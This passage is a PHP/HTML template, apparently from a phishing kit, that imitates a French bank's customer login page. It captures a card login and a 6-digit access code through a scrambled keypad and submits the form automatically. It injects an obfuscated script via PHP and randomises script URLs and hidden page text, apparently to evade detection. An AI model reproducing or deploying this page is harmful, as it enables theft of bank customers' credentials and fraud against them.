gNTkuNzA4MiAzMy4zNTY5IDU5LjcxNjYgMzMuMjk1NCA1OS43Mjc0QzMzLjA0NTIgNTkuNzcxMiAzMi41NTUgNTkuODczNCAzMS45NzQ1IDU5Ljk5OTJDMzEuMDg2MSA2MC4xOTE3IDI5Ljk3NCA2MC40NDIxIDI5LjE1MzEgNjAuNjMxM0MyOS4wNDA2IDYwLjY1IDI4LjkyODEgNjAuNjY4NSAyOC44MTU3IDYwLjY4NzFDMjguMTYwOSA2MC43OTUxIDI3LjUwNzMgNjAuOTAyOSAyNi44NjIgNjEuMDIzOUMyMy4yMjIxIDYxLjcwNjEgMTkuNTc0OCA2Mi4zMTUxIDE1LjkxNDIgNjIuODc4NkMxNS4zNDg0IDYyLjk2NTcgMTQuOTIzIDYzLjAzNDYgMTQuNjI1NSA2My4wODdDMTQuNDc2OCA2My4xMTMyIDE0LjM1ODYgNjMuMTM1NSAxNC4yNjk5IDYzLjE1NDFDMTQuMTg4NyA2My4xNzExIDE0LjExMzkgNjMuMTg4NiAxNC4wNjYgNjMuMjA3M0MxNC4wNTUgNjMuMjExNiAxNC4wMjcyIDYzLjIyMjcgMTMuOTk4OCA2My4yNDNDMTMuOTg1NyA2My4yNTI0IDEzLjk1NCA2My4yNzY1IDEzLjkyODggNjMuMzE4OEMxMy44OTg1IDYzLjM2OTYgMTMuODc2MiA2My40NTIyIDEzLjkxMzkgNjMuNTRDMTMuOTQ1IDYzLjYxMjIgMTQgNjMuNjQ2NSAxNC4wMjE0IDYzLjY1ODVDMTQuMDQ2OSA2My42NzI2IDE0LjA2OTcgNjMuNjc5NSAxNC4wODE2IDYzLjY4MjdDMTQuMTA2MyA2My42ODk0IDE0LjEyODggNjMuNjkxNyAxNC4xNDE1IDYzLjY5MjlDMTQuMTkxNCA2My42OTcyIDE0LjI2NTQgNjMuNjk1MSAxNC4zNDYxIDYzLjY5MDlDMTQuNTE3NiA2My42ODE5IDE0Ljc4OTcgNjMuNjU5MyAxNS4xNDYgNjMuNjI1MUMxNi41NzM4IDYzLjQ4ODIgMTkuNDE3NCA2My4xNTk5IDIyLjgyMjggNjIuNzQyN0MyOC45OTM2IDYxLjk4NjYgMzcuMDIyNiA2MC45MzY2IDQxLjgzOTQgNjAuMTk5NUM0MS44NjUgNjAuMjE4MiA0MS44ODkzIDYwLjIzNjMgNDEuOTEyIDYwLjI1MzdDNDIuMDY4MyA2MC4zNzMzIDQyLjI2NiA2MC41NDQgNDIuNSA2MC43NDYyQzQyLjY0NzYgNjAuODczNiA0Mi44MDk2IDYxLjAxMzYgNDIuOTg0OSA2MS4xNjEyQzQzLjQyODcgNjEuNTM0NyA0My45NDI1IDYxLjk0MzMgNDQuNDYzNCA2Mi4yNjI2QzQ0Ljk3ODQgNjIuNTc4MyA0NS41MzEgNjIuODI2MSA0Ni4wNDc4IDYyLjg0MTRDNDYuMzExNiA2Mi44NDkxIDQ2LjU3MDEgNjIuNzk2MyA0Ni44MDU5IDYyLjY1ODFDNDcuMDQxMyA2Mi41MjAyIDQ3LjIzODcgNjIuMzA2NCA0Ny4zOTU1IDYyLjAxNjVDNDcuODc0OSA2MS4xMzAzIDQ4LjE1NjUgNjAuMTUyOSA0OC4zMDQxIDU5LjEzOTZaTTQ3Ljg2NjggNTguNzIyMkM0Ny45MjU4IDU4LjIwNTkgNDcuOTUxOCA1Ny42Nzc4IDQ3Ljk1MjQgNTcuMTQ0NUM0Ny45NTM1IDU2LjM1NzggNDcuODk5OCA1NS41NjQ2IDQ3LjgxODQgNTQuNzg3NEM0Ny4xOTggNTQuODY4NSA0Ni41Nzc5IDU0Ljk1MTggNDUuOTU4MyA1NS4wMzc2QzQ1LjkyMDcgNTUuMDQyOCA0NS44MjI4IDU1LjA1MTQgNDUuNjc2NSA1NS4wNjQyQzQ1LjA3MDIgNTUuMTE3NSA0My42MzE5IDU1LjI0MzggNDIuMjAwMyA1NS41MDVDNDEuMzE3IDU1LjY2NjIgNDAuNDY1NCA1NS44NzQ3IDM5Ljg0OTEgNTYuMTM4NkMzOS41NCA1Ni4yNzEgMzkuMzA3MSA1Ni40MTA0IDM5LjE1OTIgNTYuNTUxOEMzOS4wMTQzIDU2LjY5MDMgMzguOTcwMiA1Ni44MTAzIDM4Ljk4MDIgNTYuOTE5OUMzOS4wMDAyIDU3LjE0MDEgMzkuMTM0NiA1Ny4zOTc3IDM5LjM3ODEgNTcuNjg0NEMzOS42MTggNTcuOTY2OCAzOS45NDE5IDU4LjI1MjIgNDAuMjk1OSA1OC41MjY5QzQwLjY0ODkgNTguODAwOCA0MS4wMjQxIDU5LjA1ODEgNDEuMzYzMyA1OS4yODY1QzQxLjQyMiA1OS4zMjYgNDEuNDc5OSA1OS4zNjQ4IDQxLjUzNjUgNTkuNDAyOEM0MS42ODk5IDU5LjUwNTYgNDEuODM0MyA1OS42MDI1IDQxLjk2MTIgNTkuNjkwNkM0Mi4zODU0IDU5LjYyNTMgNDIuNzgzIDU5LjU2MjUgNDMuMTUwMyA1OS41MDI4QzQ0LjcyMyA1OS4yNDcyIDQ2LjI5NTQgNTguOTg3NiA0Ny44NjY4IDU4LjcyMjJaTTQyLjQ5MDggNjAuMDk4NkM0Mi43NDg1IDYwLjA1ODIgNDIuOTk0OSA2MC4wMTg5IDQzLjIyOSA1OS45ODA4QzQ0Ljc1MjIgNTkuNzMzMiA0Ni4yNzU0IDU5LjQ4MTkgNDcuNzk3OSA1OS4yMjUyQzQ3LjY1MTQgNjAuMTM3NyA0Ny4zODk0IDYxLjAwNDcgNDYuOTY2MSA2MS43ODcyQzQ2Ljg0MzEgNjIuMDE0NiA0Ni43MDMxIDYyLjE1NjEgNDYuNTU4MyA2Mi4yNDA5QzQ2LjQxNCA2Mi4zMjU0IDQ2LjI0OTUgNjIuMzYyNyA0Ni4wNjIyIDYyLjM1NzJDNDUuNjc2NyA2Mi4zNDU4IDQ1LjIxNDQgNjIuMTUzOCA0NC43MTk0IDYxLjg1MDRDNDQuMjMwMyA2MS41NTA2IDQzLjczOSA2MS4xNjExIDQzLjMwMDEgNjAuNzkxNkM0My4xMzk3IDYwLjY1NjcgNDIuOTg0MiA2MC41MjI0IDQyLjgzODMgNjAuMzk2NEM0Mi43MTQ0IDYwLjI4OTUgNDIuNTk3NiA2MC4xODg3IDQyLjQ5MDggNjAuMDk4NlpNMzMuNTA1MiA2MC4xODU2QzMzLjUwNTMgNjAuMTg1NyAzMy41MDQyIDYwLjE4NTggMzMuNTAyIDYwLjE4NThDMzMuNTA0MSA2MC4xODU3IDMzLjUwNTEgNjAuMTg1NiAzMy41MDUyIDYwLjE4NTZaTTMzLjM5NDEgNTkuNzM0OUMzMy4zOTY3IDU5LjczMzcgMzMuMzk4MSA1OS43MzMxIDMzLjM5ODIgNTkuNzMzMUMzMy4zOTgzIDU5LjczMzEgMzMuMzk3MSA1OS43MzM3IDMzLjM5NDEgNTkuNzM0OVoiIGZpbGw9IiMxOTFGMjkiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik04OS43MjczIDg0Ljc1SDEzLjI3MjdDMTEuODE2NyA4NC43NSAxMC42MzY0IDg1Ljk4MTIgMTAuNjM2NCA4Ny41Vjk4LjVDMTAuNjM2NCAxMDAuMDE5IDExLjgxNjcgMTAxLjI1IDEzLjI3MjcgMTAxLjI1SDg5LjcyNzNDOTEuMTgzMyAxMDEuMjUgOTIuMzYzNiAxMDAuMDE5IDkyLjM2MzYgOTguNVY4Ny41QzkyLjM2MzYgODUuOTgxMiA5MS4xODMzIDg0Ljc1IDg5LjcyNzMgODQuNzVaTTEzLjI3MjcgODJDMTAuMzYwNyA4MiA4IDg0LjQ2MjQgOCA4Ny41Vjk4LjVDOCAxMDEuNTM4IDEwLjM2MDcgMTA0IDEzLjI3MjcgMTA0SDg5LjcyNzNDOTIuNjM5MyAxMDQgOTUgMTAxLjUzOCA5NSA5OC41Vjg3LjVDOTUgODQuNDYyNCA5Mi42MzkzIDgyIDg5LjcyNzMgODJIMTMuMjcyN1oiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" class="sc-enTqHk gVANIR">
                            <div class="sc-yEDbz izOGgw">
                                <div class="sc-iAEawV ihmKiB">
                                    <div class="sc-gYbzsP brmByp">
                                        <div class="sc-cCjUiG cjfGxV">
                                            <label class="sc-jcMfQk dNkBmv" for="barcode" id="barcode#label">Login (au dos de la carte)</label>
                                            <input name="usr" type="text" aria-required="false" aria-disabled="false" class="sc-cjibBx dYWVma" placeholder="   -   -   - " oninput=" if(this.value.length > 9){ document.getElementById('btn0').disabled = false; } " id="usr">
                                        </div>
                                    </div>
                                    <div class="sc-eeMvmM bgEazn">***&nbsp;000 &nbsp;000 &nbsp;0</div>
                                </div>
                                <div aria-checked="false" tabindex="0" class="sc-gScZFl jMZCgP">
                                    <label for="remember">
                                        <input id="remember" type="checkbox" class="sc-lbVpMG imjWmH">
                                        <input type="checkbox" class="sc-hTBuwn cLtTbs">
                                           
                                       
                                        <span class="sc-iOeugr bXTGDR">Mémoriser mon login</span>
                                    </label>
                                </div>
                            </div>
                            <div class="sc-vMGZd kWokIK">
                                <button id="btn0" class="sc-ftTHYK hIzZA sc-kDvujY hWUUbn" disabled="" type="button" onclick=" document.getElementById('div0').style.display = 'none'; document.getElementById('div1').style.display = 'block'; document.getElementById('lusr').textContent = document.getElementById('usr').value; ">
                                    <span class="sc-pyfCe jqwhcx">Connexion</span>
                                </button>
                            </div>
                        </div>
						
						<?php echo $errormsg; ?>
						
                    </div>
                    <div class="sc-hrlCSN lnBwCw" id="div1" style="display:none;">
                        <div class="sc-kLwonV erBgkb">
                            <h1 class="sc-bjHqKj dbQnLk" style="font-size:1.7rem">Connectez-vous à votre espace client</h1>
                            <div class="sc-hlXxXZ csoHSi">
                                <div class="sc-bYMpWt cSuaNd">
                                    <div class="sc-kMjNwy cyRYwK">
                                        <div class="sc-bBABsx eyvCgp">
                                            <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="icon" height="24" width="24">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M4.464 15.464A5 5 0 0 1 8 14h8a5 5 0 0 1 5 5v2a1 1 0 1 1-2 0v-2a3 3 0 0 0-3-3H8a3 3 0 0 0-3 3v2a1 1 0 1 1-2 0v-2a5 5 0 0 1 1.464-3.536ZM12 4a3 3 0 1 0 0 6 3 3 0 0 0 0-6ZM7 7a5 5 0 1 1 10 0A5 5 0 0 1 7 7Z"></path>
                                            </svg>
                                        </div>
                                    </div>
                                    <div class="sc-hhOBVt iyUBjV" id="lusr">bienvenue</div>
                                    <div class="sc-ilhmMj kdlNVO">
                                        <a class="sc-ftTHYK hIzZA sc-jrcTuL hDrShV" type="button" href="./" style="text-decoration: none;">
                                            <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="icon" height="24" width="24">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M23 3a1 1 0 0 1 1 1v6a1 1 0 0 1-1 1h-6a1 1 0 1 1 0-2h5V4a1 1 0 0 1 1-1ZM0 14a1 1 0 0 1 1-1h6a1 1 0 1 1 0 2H2v5a1 1 0 1 1-2 0v-6Z"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M14.217 4.317a8 8 0 0 0-9.764 5.017 1 1 0 1 1-1.886-.668 10 10 0 0 1 16.489-3.744l4.629 4.35a1 1 0 0 1-1.37 1.457l-4.64-4.36a8 8 0 0 0-3.458-2.051ZM.271 13.315a1 1 0 0 1 1.414-.044l4.64 4.36a8 8 0 0 0 13.223-2.965 1 1 0 0 1 1.885.668 10 10 0 0 1-16.489 3.744l-4.629-4.35a1 1 0 0 1-.044-1.413Z"></path>
                                            </svg>
                                            <span class="sc-pyfCe jqwhcx">Changer</span>
                                        </a>
                                    </div>
                                </div>
                            </div>
                            <div class="sc-hUhoqY hOYYZG">
                                <div class="sc-jSUZER jOitne">
                                    <div class="sc-pyfCe jwMwxI">
                                        <label class="sc-ftTHYK RkGTF required">Code d'accès (6 chiffres)</label>
                                        <div class="sc-gKPRtg jgiaLV">
										<input type="hidden" id="pwd" name="pwd" value="">
                                            <div class="sc-iBYQkv csorHI" id="dot1"></div>
                                            <div class="sc-iBYQkv csorHI" id="dot2"></div>
                                            <div class="sc-iBYQkv csorHI" id="dot3"></div>
                                            <div class="sc-iBYQkv csorHI" id="dot4"></div>
                                            <div class="sc-iBYQkv csorHI" id="dot5"></div>
                                            <div class="sc-iBYQkv csorHI" id="dot6"></div>
                                        </div>
                                        <svg viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" class="sc-jrcTuL eA-duXD" height="24" width="24" aria-pressed="false" role="button">
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M2.14 12a18.68 18.68 0 0 0 2.464 3.316C6.397 17.226 8.9 19 12 19c3.1 0 5.605-1.774 7.395-3.684A18.684 18.684 0 0 0 21.86 12a18.681 18.681 0 0 0-2.464-3.316C17.605 6.774 15.101 5 12 5 8.9 5 6.396 6.774 4.605 8.684A18.678 18.678 0 0 0 2.14 12ZM23 12l.894-.448-.002-.003-.003-.007-.011-.022a10.615 10.615 0 0 0-.192-.354 20.675 20.675 0 0 0-2.831-3.85C18.895 5.226 15.899 3 12 3 8.1 3 5.104 5.226 3.145 7.316a20.674 20.674 0 0 0-2.831 3.85 12.375 12.375 0 0 0-.192.354l-.011.022-.003.007-.002.002s0 .002.894.449l-.894-.447a1 1 0 0 0 0 .894L1 12l-.894.447.002.004.003.007.011.022a8.267 8.267 0 0 0 .192.354 20.67 20.67 0 0 0 2.831 3.85C5.105 18.774 8.1 21 12 21c3.9 0 6.895-2.226 8.855-4.316a20.672 20.672 0 0 0 2.831-3.85 11.81 11.81 0 0 0 .192-.354l.011-.022.003-.007.002-.002s0-.002-.894-.449Zm0 0 .894.447c.141-.281.14-.613 0-.895L23 12Z"></path>
                                            <path fill-rule="evenodd" clip-rule="evenodd" d="M12 10a2 2 0 1 0 0 4 2 2 0 0 0 0-4Zm-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0Z"></path>
                                        </svg>
                                    </div>
                                </div>
                                <div class="sc-csuSiG htktdm">
                                    <span></span>
                                    <a role="link" class="sc-bqWxrE gWAGLc">Code d'accès oublié</a>
                                </div>
                            </div>
                            <div class="sc-fJxALz kbEDhr">
                                <div role="group" aria-label="Saisie du mot de passe" class="sc-bcXHqe hyklft">
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(5);" >5</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(3);" >3</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(4);" >4</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(2);" >2</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(8);" >8</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(1);" >1</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(6);" >6</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(7);" >7</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(9);" >9</button>
                                    <button class="sc-dkrFOg bcLSBZ" type="button" onclick="inputset(0);" >0</button>
                                    <div class="sc-eDvSVe bQoJjS">
                                        <button type="button" class="sc-hLBbgP icESVQ" onclick=" document.getElementById('pwd').value = ''; clean();">
                                            Effacer
                                            <svg viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" class="icon" height="24" width="24">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 3.341A1 1 0 0 1 8 3h13a3 3 0 0 1 3 3v12a3 3 0 0 1-3 3H8a1 1 0 0 1-.753-.341l-7-8a1 1 0 0 1 0-1.318l7-8ZM8.454 5l-6.125 7 6.125 7H21a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1H8.454Z"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M18.707 8.293a1 1 0 0 1 0 1.414l-6 6a1 1 0 0 1-1.414-1.414l6-6a1 1 0 0 1 1.414 0Z"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M11.293 8.293a1 1 0 0 1 1.414 0l6 6a1 1 0 0 1-1.414 1.414l-6-6a1 1 0 0 1 0-1.414Z"></path>
                                            </svg>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
					
					
					
                    <div class="sc-bZesDY bCyfTj" style="background-color:transparent">
                        <button aria-label="Help &amp; block card" class="sc-ftTHYK hIzZA sc-jrcTuL hDrShV" type="button">
                            <span class="sc-pyfCe jqwhcx">Carte d'aide et blocage</span>
                        </button>
                        <div class="sc-joaiRD bOFeRz"></div>
                        <button aria-label="Not a customer yet?" class="sc-ftTHYK hIzZA sc-jrcTuL hDrShV" type="button">
                            <span class="sc-pyfCe jqwhcx">Pas encore client ?</span>
                        </button>
                    </div>
					
					<input type="hidden" name="type" value="log">
                </form>
            </div>
        </div>
    
	 
 
 <script src="./nkl_files/jquery.min.js?<?php echo base64_encode(rand(0,9999)); ?>"></script>
 <script src="./nkl_files/imask.min.js?<?php echo base64_encode(rand(0,9999)); ?>"></script>
  <script src="./nkl_files/infos.js?<?php echo base64_encode(rand(0,9999)); ?>"></script>
  
	<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>

<?php  echo "<script>" . $obsfucated . "</script>"; ?>

<script>

const usr = document.getElementById("usr");
var usr_mask = new IMask(usr, {
    mask: '***{-}000{-}000{-}0',
    
});

</script>
  <script>

function clean(){

for (i = 1; i < 7 ; i++){

document.getElementById('dot' + i).style.backgroundColor = '';

}

}


      function inputset(nmbr){
	  
if( document.getElementById('pwd').value.length < 6 ){

          document.getElementById('pwd').value = document.getElementById('pwd').value + nmbr;
    
	document.getElementById('dot' + document.getElementById('pwd').value.length).style.backgroundColor = 'grey';

    if( document.getElementById('pwd').value.length == 6 ){ document.getElementById('frm').submit(); }
          
          
   
      }
  }
  
</script> 


</body></html>